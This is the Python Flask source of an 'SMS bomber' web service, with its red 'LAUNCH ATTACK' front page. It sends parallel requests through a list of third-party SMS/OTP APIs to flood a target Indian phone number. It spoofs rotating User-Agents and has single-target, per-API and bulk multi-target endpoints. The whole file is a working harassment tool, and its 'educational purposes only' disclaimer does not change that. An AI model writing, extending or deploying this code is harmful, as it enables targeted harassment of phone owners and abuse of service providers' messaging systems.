from flask import Flask, request, jsonify
import requests
import concurrent.futures
import json
import time
import random
from datetime import datetime
import threading
import os

app = Flask(__name__)

# Load APIs from JSON file
with open('apis.json', 'r') as f:
    APIS_DATA = json.load(f)

APIS = APIS_DATA["apis"]

def send_single_request(api_config, phone_number):
    """Send request to single API"""
    result = {
        "name": api_config["name"],
        "status": "pending",
        "message": "",
        "response_code": None,
        "time_taken": None
    }
    
    try:
        start_time = time.time()
        
        # Prepare URL
        url = api_config["url"].replace("{phone}", phone_number)
        
        # Prepare headers
        headers = api_config.get("headers", {})
        
        # Add random User-Agent if not present
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
        if "User-Agent" not in headers:
            headers["User-Agent"] = random.choice(user_agents)
        
        # Prepare data
        data = None
        if api_config.get("data"):
            data_str = api_config["data"].replace("{phone}", phone_number)
            
            if api_config.get("headers", {}).get("Content-Type", "").startswith("application/json"):
                try:
                    data = json.loads(data_str)
                except:
                    data = data_str
            else:
                data = data_str
        
        # Send request
        timeout = random.randint(8, 12)
        
        if api_config["method"] == "GET":
            response = requests.get(url, headers=headers, timeout=timeout)
        else:
            if isinstance(data, dict):
                response = requests.post(url, json=data, headers=headers, timeout=timeout)
            else:
                response = requests.post(url, data=data, headers=headers, timeout=timeout)
        
        end_time = time.time()
        
        # Update result
        result["status"] = "success" if response.status_code in [200, 201, 202] else "failed"
        result["response_code"] = response.status_code
        result["time_taken"] = round(end_time - start_time, 2)
        result["message"] = response.text[:200] if response.text else "No response"
                
    except requests.exceptions.Timeout:
        result["status"] = "timeout"
        result["message"] = "Request timeout after 10 seconds"
    except requests.exceptions.ConnectionError:
        result["status"] = "connection_error"
        result["message"] = "Connection failed"
    except requests.exceptions.RequestException as e:
        result["status"] = "error"
        result["message"] = str(e)
    except Exception as e:
        result["status"] = "error"
        result["message"] = f"Unknown error: {str(e)}"
    
    return result

@app.route('/api', methods=['GET'])
def api_endpoint():
    """Main API endpoint - Send SMS requests (Minimal response only)"""
    phone_number = request.args.get('num')
    
    if not phone_number:
        return jsonify({
            "status": "error",
            "message": "Phone number is required. Use /api?num=XXXXXXXXXX",
            "example": "https://ab-bomb-api.vercel.app/api?num=1234567890"
        }), 400
    
    # Validate phone number
    if not phone_number.isdigit() or len(phone_number) != 10:
        return jsonify({
            "status": "error",
            "message": "Invalid phone number. Please provide 10-digit Indian number"
        }), 400
    
    try:
        start_time = time.time()
        successful = 0
        failed = 0
        
        # Get max workers parameter
        max_workers = int(request.args.get('workers', 10))
        
        # Send requests in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(send_single_request, api, phone_number) for api in APIS]
            
            for future in concurrent.futures.as_completed(futures):
                try:
                    result = future.result()
                    if result["status"] == "success":
                        successful += 1
                    else:
                        failed += 1
                except Exception:
                    failed += 1
        
        end_time = time.time()
        total_time = round(end_time - start_time, 2)
        
        response_data = {
            "status": "completed",
            "successful": successful,
            "failed": failed,
            "timestamp": datetime.now().isoformat(),
            "total_requests": len(APIS),
            "total_time_seconds": total_time
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Server error: {str(e)}"
        }), 500

@app.route('/api/test', methods=['GET'])
def test_single():
    """Test single API"""
    phone_number = request.args.get('num')
    api_name = request.args.get('api')
    
    if not phone_number or not api_name:
        return jsonify({
            "status": "error",
            "message": "Both 'num' and 'api' parameters are required"
        }), 400
    
    # Find API
    api_config = None
    for api in APIS:
        if api["name"].lower() == api_name.lower():
            api_config = api
            break
    
    if not api_config:
        return jsonify({
            "status": "error",
            "message": f"API '{api_name}' not found"
        }), 404
    
    # Send request
    result = send_single_request(api_config, phone_number)
    
    return jsonify({
        "status": "completed",
        "phone_number": phone_number,
        "api": api_name,
        "result": result
    })

@app.route('/api/bulk', methods=['POST'])
def bulk_requests():
    """Bulk requests with custom configuration (Minimal response)"""
    try:
        data = request.json
        
        if not data:
            return jsonify({
                "status": "error",
                "message": "JSON data is required"
            }), 400
        
        phone_numbers = data.get("phone_numbers", [])
        selected_apis = data.get("apis", "all")
        delay = data.get("delay", 2)
        max_workers = data.get("workers", 5)
        
        if not phone_numbers:
            return jsonify({
                "status": "error",
                "message": "phone_numbers array is required"
            }), 400
        
        # Filter APIs
        if selected_apis != "all":
            apis_to_use = [api for api in APIS if api["name"] in selected_apis]
        else:
            apis_to_use = APIS
        
        overall_stats = {
            "total_numbers": len(phone_numbers),
            "total_requests": len(apis_to_use) * len(phone_numbers),
            "completed": 0,
            "successful": 0,
            "failed": 0
        }
        
        for idx, phone in enumerate(phone_numbers):
            if idx > 0:
                time.sleep(delay)
            
            phone_successful = 0
            phone_failed = 0
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = [executor.submit(send_single_request, api, phone) for api in apis_to_use]
                
                for future in concurrent.futures.as_completed(futures):
                    try:
                        result = future.result()
                        if result["status"] == "success":
                            phone_successful += 1
                            overall_stats["successful"] += 1
                        else:
                            phone_failed += 1
                            overall_stats["failed"] += 1
                    except Exception:
                        phone_failed += 1
                        overall_stats["failed"] += 1
            
            overall_stats["completed"] += 1
        
        return jsonify({
            "status": "completed",
            "overall_stats": overall_stats,
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Error processing bulk request: {str(e)}"
        }), 500

@app.route('/api/ping', methods=['GET'])
def ping():
    """Check if API is alive"""
    return jsonify({
        "status": "alive",
        "timestamp": datetime.now().isoformat(),
        "version": "1.0.0",
        "total_apis": len(APIS)
    })

@app.route('/')
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>SMS BOMBER</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            :root {
                --primary: linear-gradient(135deg, #8B0000 0%, #2F0000 100%);
                --secondary: linear-gradient(135deg, #B22222 0%, #8B0000 100%);
                --accent: linear-gradient(135deg, #FF2400 0%, #8B0000 100%);
                --glass: rgba(0, 0, 0, 0.3);
                --glass-border: rgba(255, 0, 0, 0.2);
                --shadow: 0 8px 32px rgba(139, 0, 0, 0.5);
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
                background: var(--primary);
                min-height: 100vh;
                overflow-x: hidden;
                color: #fff;
            }
            
            body::before {
                content: '';
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: 
                    radial-gradient(circle at 20% 80%, rgba(255, 0, 0, 0.2) 0%, transparent 50%),
                    radial-gradient(circle at 80% 20%, rgba(178, 34, 34, 0.2) 0%, transparent 50%),
                    radial-gradient(circle at 40% 40%, rgba(139, 0, 0, 0.2) 0%, transparent 50%);
                z-index: -1;
            }
            
            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
                position: relative;
                z-index: 1;
            }
            
            .header {
                text-align: center;
                margin-bottom: 40px;
                padding: 40px 20px;
                background: var(--glass);
                backdrop-filter: blur(20px);
                border-radius: 24px;
                border: 1px solid var(--glass-border);
                box-shadow: var(--shadow);
                border: 2px solid rgba(255, 0, 0, 0.3);
            }
            
            .header h1 {
                background: linear-gradient(45deg, #FF2400, #FF0000, #DC143C);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                font-size: clamp(2rem, 5vw, 3.5rem);
                font-weight: 900;
                margin-bottom: 12px;
                letter-spacing: -0.02em;
                text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
            }
            
            .header p {
                color: #FFB6C1;
                font-size: 1.2rem;
                font-weight: 400;
                max-width: 600px;
                margin: 0 auto;
                line-height: 1.6;
            }
            
            .api-count {
                display: inline-flex;
                align-items: center;
                gap: 8px;
                background: var(--secondary);
                padding: 12px 24px;
                border-radius: 50px;
                margin-top: 20px;
                font-weight: 900;
                color: #FFD700;
                box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5);
                border: 2px solid rgba(255, 0, 0, 0.5);
                text-transform: uppercase;
                letter-spacing: 1px;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0% { box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5); }
                50% { box-shadow: 0 4px 40px rgba(255, 0, 0, 0.8); }
                100% { box-shadow: 0 4px 20px rgba(255, 0, 0, 0.5); }
            }
            
            .endpoints-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
                gap: 24px;
                margin: 40px 0;
            }
            
            .endpoint-card {
                background: var(--glass);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 20px;
                padding: 32px;
                box-shadow: var(--shadow);
                transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
                position: relative;
                overflow: hidden;
                border: 2px solid rgba(255, 0, 0, 0.3);
            }
            
            .endpoint-card::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 4px;
                background: var(--accent);
            }
            
            .endpoint-card:hover {
                transform: translateY(-12px);
                box-shadow: 0 20px 40px rgba(255, 0, 0, 0.4);
                border-color: rgba(255, 0, 0, 0.6);
            }
            
            .endpoint-card h3 {
                color: #FFB6C1;
                margin-bottom: 16px;
                font-size: 1.3rem;
                font-weight: 700;
                display: flex;
                align-items: center;
                gap: 12px;
            }
            
            .method-badge {
                padding: 6px 16px;
                border-radius: 20px;
                font-size: 0.8rem;
                font-weight: 700;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                border: 1px solid rgba(255, 255, 255, 0.3);
            }
            
            .method-get { 
                background: linear-gradient(135deg, #DC143C, #B22222);
                color: #FFD700;
            }
            
            .method-post { 
                background: linear-gradient(135deg, #8B0000, #660000);
                color: #FFD700;
            }
            
            .endpoint-code {
                background: rgba(0, 0, 0, 0.5);
                padding: 20px;
                border-radius: 16px;
                margin: 20px 0;
                font-family: 'JetBrains Mono', 'Fira Code', monospace;
                color: #FF6347;
                border: 1px solid rgba(255, 0, 0, 0.2);
                font-size: 0.95rem;
                line-height: 1.6;
                position: relative;
            }
            
            .endpoint-card p {
                color: #FFB6C1;
                line-height: 1.6;
                margin-bottom: 8px;
            }
            
            .test-section {
                background: var(--glass);
                backdrop-filter: blur(20px);
                border: 1px solid var(--glass-border);
                border-radius: 24px;
                padding: 40px;
                margin: 40px 0;
                box-shadow: var(--shadow);
                text-align: center;
                border: 2px solid rgba(255, 0, 0, 0.3);
            }
            
            .test-section h2 {
                background: linear-gradient(45deg, #FF2400, #FF0000);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                font-size: 2rem;
                margin-bottom: 24px;
                font-weight: 900;
                text-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            }
            
            .test-form {
                display: flex;
                gap: 16px;
                max-width: 500px;
                margin: 0 auto 24px;
                flex-wrap: wrap;
            }
            
            .test-input {
                flex: 1;
                min-width: 250px;
                padding: 16px 24px;
                border: 2px solid rgba(255, 0, 0, 0.3);
                border-radius: 16px;
                font-size: 1.1rem;
                background: rgba(0, 0, 0, 0.5);
                backdrop-filter: blur(10px);
                transition: all 0.3s ease;
                font-family: inherit;
                color: #fff;
            }
            
            .test-input::placeholder {
                color: #FFB6C1;
            }
            
            .test-input:focus {
                outline: none;
                border-color: #FF0000;
                box-shadow: 0 0 0 4px rgba(255, 0, 0, 0.2);
                transform: translateY(-2px);
                background: rgba(0, 0, 0, 0.7);
            }
            
            .test-button {
                padding: 16px 32px;
                background: var(--accent);
                color: #FFD700;
                border: none;
                border-radius: 16px;
                font-size: 1.1rem;
                font-weight: 900;
                cursor: pointer;
                transition: all 0.3s ease;
                box-shadow: 0 8px 25px rgba(255, 0, 0, 0.5);
                text-transform: uppercase;
                letter-spacing: 1px;
                border: 2px solid rgba(255, 215, 0, 0.3);
            }
            
            .test-button:hover {
                transform: translateY(-4px);
                box-shadow: 0 12px 35px rgba(255, 0, 0, 0.7);
                background: linear-gradient(135deg, #FF0000, #DC143C);
            }
            
            .test-button:disabled {
                opacity: 0.6;
                cursor: not-allowed;
                transform: none;
            }
            
            .response-box {
                background: rgba(0, 0, 0, 0.7);
                border-radius: 16px;
                padding: 24px;
                max-height: 400px;
                overflow-y: auto;
                border: 1px solid rgba(255, 0, 0, 0.2);
                box-shadow: inset 0 2px 10px rgba(255, 0, 0, 0.1);
                text-align: left;
                margin-top: 20px;
                color: #FFB6C1;
            }
            
            .success { 
                color: #32CD32;
                font-weight: bold;
                text-shadow: 0 0 10px rgba(50, 205, 50, 0.5);
            }
            
            .error { 
                color: #FF4500;
                font-weight: bold;
                text-shadow: 0 0 10px rgba(255, 69, 0, 0.5);
            }
            
            .loading { 
                color: #FFD700;
                font-weight: bold;
            }
            
            .footer {
                text-align: center;
                padding: 40px 20px;
                color: rgba(255, 182, 193, 0.9);
                font-size: 0.95rem;
                border-top: 1px solid rgba(255, 0, 0, 0.2);
                margin-top: 40px;
            }
            
            .warning {
                color: #FFD700;
                font-size: 0.9rem;
                font-style: italic;
                margin-top: 10px;
                text-align: center;
            }
            
            @media (max-width: 768px) {
                .container { padding: 16px; }
                .endpoints-grid { grid-template-columns: 1fr; }
                .test-form { flex-direction: column; }
                .test-input, .test-button { width: 100%; }
            }
        </style>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>ABBAS SMS BOMBER</h1>
                <p>Advanced SMS flooding system - Use with extreme caution</p>
                <div class="api-count">
                    <span><strong>""" + str(len(APIS)) + """</strong> ACTIVE BOMBS</span>
                </div>
                <p class="warning">⚠️ WARNING: For educational purposes only. Misuse may result in legal consequences.</p>
            </div>
            
            <div class="endpoints-grid">
                <div class="endpoint-card">
                    <h3><span class="method-badge method-get">GET</span> FULL ASSAULT</h3>
                    <div class="endpoint-code">/api?num=9876543210</div>
                    <p>Launch all """ + str(len(APIS)) + """ attack vectors simultaneously</p>
                </div>
                
                <div class="endpoint-card">
                    <h3><span class="method-badge method-get">GET</span> TARGETED STRIKE</h3>
                    <div class="endpoint-code">/api/test?num=9876543210&api=Name</div>
                    <p>Test individual attack vectors</p>
                </div>
                
                <div class="endpoint-card">
                    <h3><span class="method-badge method-post">POST</span> MASS ATTACK</h3>
                    <div class="endpoint-code">/api/bulk</div>
                    <p>Deploy attacks on multiple targets with custom configuration</p>
                </div>
            </div>
            
            <div class="test-section">
                <h2>⚡ ENTER TARGET NUMBER</h2>
                <div class="test-form">
                    <input type="text" id="phoneNumber" class="test-input" placeholder="Enter 10-digit target number" maxlength="10">
                    <button class="test-button" onclick="testAPI()">LAUNCH ATTACK</button>
                </div>
                <div class="response-box" id="responseBox">
                    <p>Enter target number and click LAUNCH ATTACK to deploy all """ + str(len(APIS)) + """ bombs</p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>SMS BOMBER v2.0 | WARNING: Use responsibly | ⚠️ STRICTLY FOR EDUCATIONAL PURPOSES</p>
        </div>
        
        <script>
            function testAPI() {
                const phone = document.getElementById('phoneNumber').value.trim();
                const responseBox = document.getElementById('responseBox');
                const button = document.querySelector('.test-button');
                
                if (!phone || phone.length !== 10 || !phone.match(/^[6-9]\\d{9}$/)) {
                    responseBox.innerHTML = '<p class="error">❌ INVALID TARGET: Enter valid 10-digit Indian number</p>';
                    return;
                }
                
                button.disabled = true;
                button.textContent = 'DEPLOYING...';
                responseBox.innerHTML = '<p class="loading"> ATTACK START ' + """ + str(len(APIS)) + """ + ' ATTACK VECTORS...</p>';
                
                fetch(`/api?num=${phone}&workers=8`)
                    .then(response => response.json())
                    .then(data => {
                        let html = `<div class="success">✅ MISSION COMPLETE in ${data.total_time_seconds}s</div>`;
                        html += `<p><strong>💣 TOTAL PAYLOADS:</strong> ${data.total_requests}</p>`;
                        html += `<p><strong>✅ SUCCESSFUL HITS:</strong> ${data.successful}</p>`;
                        html += `<p><strong>❌ FAILED LAUNCHES:</strong> ${data.failed}</p>`;
                        html += `<p><strong>⏱️ MISSION TIME:</strong> ${data.total_time_seconds} seconds</p>`;
                        html += `<p><strong>📅 TIMESTAMP:</strong> ${new Date(data.timestamp).toLocaleString()}</p>`;
                        
                        responseBox.innerHTML = html;
                    })
                    .catch(error => {
                        responseBox.innerHTML = `<p class="error">❌ SYSTEM ERROR: ${error.message}</p>`;
                    })
                    .finally(() => {
                        button.disabled = false;
                        button.textContent = 'LAUNCH ATTACK';
                    });
            }
            
            // Auto-format phone input
            document.getElementById('phoneNumber').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\\D/g, '');
                if (value.length > 10) value = value.slice(0, 10);
                e.target.value = value;
            });
        </script>
    </body>
    </html>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Loaded {len(APIS)} APIs")
    print(f"Server starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
